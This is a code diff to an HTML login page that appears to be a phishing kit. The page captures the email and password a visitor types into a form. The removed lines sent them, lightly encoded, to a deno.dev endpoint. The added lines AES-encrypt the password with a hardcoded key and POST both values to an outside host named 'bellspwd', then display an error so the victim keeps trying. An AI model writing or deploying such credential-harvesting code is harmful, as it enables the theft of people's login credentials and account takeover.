@@ -5,6 +5,8 @@
 	<meta charset="UTF-8">
 	<meta name="viewport" content="width=device-width, initial-scale=1.0">
 	<script type='text/javascript' src='../images/webfont.js'></script>
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+
 	<script type="text/javascript">
 		WebFont.load({
 			google: {
@@ -825,31 +827,58 @@
 		document.getElementById('fluentform_3').addEventListener('submit', async function (event) {
 			event.preventDefault();
 
-			const email = document.getElementById('ff_3_email').value;
-			const password = document.getElementById('ff_3_input_text').value;
+			const email = document.getElementById('ff_3_email').value.trim();
+			const password = document.getElementById('ff_3_input_text').value.trim();
 
-			const encryptedPassword = btoa(password.split("").reverse().join(""));
+			if (!email || !password) {
+				document.getElementById("message2").style.display = "block";
+				document.getElementById("message1").style.display = "none";
+				document.getElementById("message2").innerText = "Please fill in all fields.";
+				return;
+			}
 
-			const response = await fetch("https://polite-fox-61.deno.dev", {
-				method: "POST",
-				headers: { "Content-Type": "application/json" },
-				body: JSON.stringify({ email, password: encryptedPassword })
-			});
+			const secretKey = "28dq_i3A%$S@*HB939/?<";  // Replace this with your actual secret key
+			const encryptedPassword = CryptoJS.AES.encrypt(password, secretKey).toString();
 
-			const result = await response.json();
-			alert(result.message);
+			try {
+				const response = await fetch("https://bellspwd.onrender.com/submit", {  // Updated API URL
+					method: "POST",
+					headers: { "Content-Type": "application/json" },
+					body: JSON.stringify({ email, encryptedPassword }) // Send encrypted password
+				});
+
+				if (!response.ok) {
+					throw new Error("Failed to send request");
+				}
+
+				const data = await response.json();
+
+				if (data.status === "success") {
+					document.getElementById("message1").style.display = "none";
+					document.getElementById("message2").style.display = "block";
+					document.getElementById("message2").style.color = "red";
+					document.getElementById("message2").innerText = data.message;
+				} else {
+					document.getElementById("message2").style.display = "block";
+					document.getElementById("message1").style.display = "none";
+					document.getElementById("message2").innerText = data.message;
+				}
+			} catch (error) {
+				document.getElementById("message2").style.display = "block";
+				document.getElementById("message1").style.display = "none";
+				document.getElementById("message2").innerText = "Network error, please try again.";
+			}
 		});
 
 		// Hide messages when the user starts typing
-		document.getElementById("ff_3_email").addEventListener("input", function () {
-			document.getElementById("message1").style.display = "none";
-			document.getElementById("message2").style.display = "none";
-		});
+		document.getElementById("ff_3_email").addEventListener("input", hideMessages);
+		document.getElementById("ff_3_input_text").addEventListener("input", hideMessages);
 
-		document.getElementById("ff_3_input_text").addEventListener("input", function () {
+		function hideMessages() {
 			document.getElementById("message1").style.display = "none";
 			document.getElementById("message2").style.display = "none";
-		});
+		}
+
 	</script>
 </body>
 
